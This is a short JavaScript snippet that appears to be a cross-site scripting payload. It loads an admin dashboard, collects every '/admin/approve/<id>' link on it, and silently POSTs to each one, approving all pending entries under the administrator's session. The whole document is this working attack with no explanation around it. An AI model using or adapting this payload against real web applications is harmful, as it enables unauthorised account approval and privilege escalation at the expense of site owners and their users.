fetch('/admin/dashboard').then(r => r.text()).then(text => {
    let userIds = text.match(/\/admin\/approve\/(\d+)/g) || [];
    userIds.forEach(id => {
      fetch(id.replace(/\/admin\/approve\//, '/admin/approve/'), {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
      });
    });
  });
